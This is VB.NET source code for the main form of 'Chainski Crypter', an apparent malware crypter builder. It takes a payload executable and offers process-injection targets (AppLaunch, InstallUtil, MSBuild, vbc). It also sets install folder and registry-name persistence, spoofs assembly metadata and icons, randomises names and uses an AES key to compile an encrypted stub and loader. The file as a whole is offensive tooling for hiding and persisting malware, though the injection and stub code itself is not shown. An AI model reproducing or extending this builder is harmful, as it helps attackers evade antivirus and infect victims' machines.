Imports Chainski_Crypter.Util
Imports Chainski_Crypter.Build
Imports System
Imports System.Threading.Tasks
Imports System.Windows.Forms
Imports System.IO


Namespace Chainski_Crypter.Forms
	Partial Public Class ChainskiCrypter
		Inherits Form

		Private ReadOnly formInformation As FormInformation
		Private ReadOnly formChangeIcon As FormChangeIcon
		Private ReadOnly randomFileInfo As RandomFileInfo
		Private ReadOnly randomCharacters As RandomCharacters
		Private currentInjection As String
		Public Sub New()
			Me.formInformation = New FormInformation()
			Me.formChangeIcon = New FormChangeIcon()
			Me.randomCharacters = New RandomCharacters()
			Me.randomFileInfo = New RandomFileInfo(randomCharacters)
			Me.currentInjection = "AppLaunch"
			InitializeComponent()
			SetupFoldername()
			Console.Beep()
		End Sub

		Private Sub Form1_Load(ByVal sender As Object, ByVal e As EventArgs) Handles MyBase.Load
			Me.Text = $"Chainski Crypter"
		End Sub

		'browser payload
		Private Sub BtnPayloadBrowse_Click(ByVal sender As Object, ByVal e As EventArgs) Handles btnPayloadBrowse.Click
			Using openFileDialog = New OpenFileDialog()
				openFileDialog.Filter = "Executable (*.exe)|*.exe"
				If openFileDialog.ShowDialog() = System.Windows.Forms.DialogResult.OK Then
					txtPayload.Text = openFileDialog.FileName
					btnBuild.Enabled = True
				Else
					btnBuild.Enabled = False
				End If
			End Using
		End Sub

		'open assembly information changer
		Private Sub BtnInformation_Click(ByVal sender As Object, ByVal e As EventArgs) Handles btnInformation.Click
			formInformation.ShowDialog()
		End Sub

		'open icon changer
		Private Sub BtnIcon_Click(ByVal sender As Object, ByVal e As EventArgs) Handles btnIcon.Click
			formChangeIcon.ShowDialog()
		End Sub

		'random
		Private Sub BtnFillenameRandom_Click(ByVal sender As Object, ByVal e As EventArgs) Handles btnFillenameRandom.Click
			Dim newInfo = randomFileInfo.getRandomFileInfo()
			txtFilename.Text = newInfo.Title.Replace(".exe", Nothing)
		End Sub

		'random
		Private Sub BtnRegistrynameRandom_Click(ByVal sender As Object, ByVal e As EventArgs) Handles btnRegistrynameRandom.Click
			Dim newInfo = randomFileInfo.getRandomFileInfo()
			txtRegistryname.Text = newInfo.Title.Replace(".exe", Nothing)
		End Sub

		'random
		Private Sub BtnFoldernameRandom_Click(ByVal sender As Object, ByVal e As EventArgs) Handles btnFoldernameRandom.Click
			txtFoldername.SelectedIndex = (New Random()).Next(txtFoldername.Items.Count)
		End Sub

		Private Sub BtnSecondFolderRandom_Click(ByVal sender As Object, ByVal e As EventArgs) Handles btnSecondFolderRandom.Click
			Dim newInfo = randomFileInfo.getRandomFileInfo()
			txtSecondFolder.Text = newInfo.Title.Replace(".exe", Nothing)
		End Sub

		' get all SpecialFolder
		Private Sub SetupFoldername()
			Const ApplicationDataFolder As String = "ApplicationData"
			For Each typeSpecialFolder In System.Enum.GetValues(GetType(Environment.SpecialFolder))
				txtFoldername.Items.Add(typeSpecialFolder)
				If typeSpecialFolder.ToString() = ApplicationDataFolder Then
					txtFoldername.Text = ApplicationDataFolder
				End If
			Next typeSpecialFolder
		End Sub

		Private Async Sub BtnBuild_Click(ByVal sender As Object, ByVal e As EventArgs) Handles btnBuild.Click
			Using saveFileDialog = New SaveFileDialog()
				saveFileDialog.Filter = "Executable (*.exe)|*.exe"
				If saveFileDialog.ShowDialog() = System.Windows.Forms.DialogResult.OK Then
					Dim setupBuild As SetupBuild = New SetupBuild With {.PayloadName = txtPayload.Text, .CommaLineIsChecked = checkBox1.Checked, .CommandLine = txtCmd.Text, .SaveFileName = saveFileDialog.FileName, .IsInstall = chkInstall.Checked, .FileName = txtFilename.Text, .FolderName = txtFoldername.Text, .SecondFolder = txtSecondFolder.Text, .RegistryName = txtRegistryname.Text, .InjectionName = currentInjection, .AssemblyTitle = formInformation.txtTitle.Text, .AssemblyDescription = formInformation.txtDescription.Text, .AssemblyProduct = formInformation.txtProduct.Text, .AssemblyCompany = formInformation.txtCompany.Text, .AssemblyCopyright = formInformation.txtCopyright.Text, .AssemblyTrademark = formInformation.txtTrademark.Text, .AssemblyMajorVersion = formInformation.assemblyMajorVersion.Value.ToString(), .AssemblyMinorVersion = formInformation.assemblyMinorVersion.Value.ToString(), .AssemblyBuildPart = formInformation.assemblyBuildPart.Value.ToString(), .AssemblyPrivatePart = formInformation.assemblyPrivatePart.Value.ToString(), .AssemblyIcon = formChangeIcon.txtIcon.Text, .Stub = My.Resources.Stub, .Loader = My.Resources.Loader, .TempDirectory = Path.Combine(Environment.CurrentDirectory, "temp"), .LoaderResourcesName = Path.GetRandomFileName().Replace(".", ""), .StubResourcesName = Path.GetRandomFileName().Replace(".", ""), .PayloadResources = Path.GetRandomFileName().Replace(".", ""), .StubLib = Path.GetRandomFileName().Replace(".", ""), .AesKey = Path.GetRandomFileName().Replace(".", "")}


					StartBuilding(False) 'turn everything off until we finish compiling
					Dim result As String = String.Empty

					Await Task.Run(Sub() 'async
						setupBuild.PrepareSource()
						result = setupBuild.Compile()
					End Sub)

					MessageBox.Show(result) 'result of codeom
					StartBuilding(True) 'trun on
				End If
			End Using
		End Sub

		'turn off while compiling
		Private Sub StartBuilding(ByVal status As Boolean)
			groupBox1.Enabled = status
			If chkInstall.Checked Then
				groupBox2.Enabled = status
			End If
			groupBox3.Enabled = status
			groupBox4.Enabled = status
			groupBox5.Enabled = status
		End Sub

		Private Sub BtnApplaunch_CheckedChanged(ByVal sender As Object, ByVal e As EventArgs) Handles btnApplaunch.CheckedChanged
			currentInjection = btnApplaunch.Text
		End Sub

		Private Sub BtnInstallutil_CheckedChanged(ByVal sender As Object, ByVal e As EventArgs) Handles btnInstallutil.CheckedChanged
			currentInjection = btnInstallutil.Text
		End Sub
		Private Sub btnMsBuild_CheckedChanged(ByVal sender As Object, ByVal e As EventArgs) Handles btnMsBuild.CheckedChanged
			currentInjection = btnMsBuild.Text
		End Sub
		Private Sub btnVBC_CheckedChanged(ByVal sender As Object, ByVal e As EventArgs) Handles btnVBC.CheckedChanged
			currentInjection = btnVBC.Text
		End Sub
		Private Sub BtnItself_CheckedChanged(ByVal sender As Object, ByVal e As EventArgs) Handles btnItself.CheckedChanged
			currentInjection = btnItself.Text
		End Sub

		Private Sub ChkInstall_CheckedChanged(ByVal sender As Object, ByVal e As EventArgs) Handles chkInstall.CheckedChanged
			If chkInstall.Checked Then
				groupBox2.Enabled = True
			Else
				groupBox2.Enabled = False
			End If
		End Sub

		Private Sub CheckBox1_CheckedChanged(ByVal sender As Object, ByVal e As EventArgs) Handles checkBox1.CheckedChanged
			If checkBox1.Checked Then
				txtCmd.Enabled = True
			Else
				txtCmd.Enabled = False
			End If
		End Sub
	End Class
End Namespace